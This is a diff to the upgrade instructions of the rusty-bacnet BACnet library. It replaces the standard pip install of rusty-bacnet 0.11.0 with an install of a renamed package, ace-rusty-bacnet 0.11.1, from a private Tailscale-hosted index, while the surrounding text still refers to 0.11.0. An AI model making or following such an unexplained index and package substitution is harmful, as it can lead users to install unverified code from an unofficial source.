@@ -14,7 +14,7 @@ Record your current package/binary version, enabled features, platform, transpor
 In a Python virtual environment:
 
 ```sh
-python -m pip install --upgrade rusty-bacnet==0.11.0
+python -m pip install --index-url https://ace-pypi.tail8c70f.ts.net/simple/ --upgrade ace-rusty-bacnet==0.11.1
 ```
 
 For Rust, align the application's `bacnet-*` dependencies with `0.11.0`. For the CLI, install or download the intended v0.11.0 binary and confirm its version and required features.
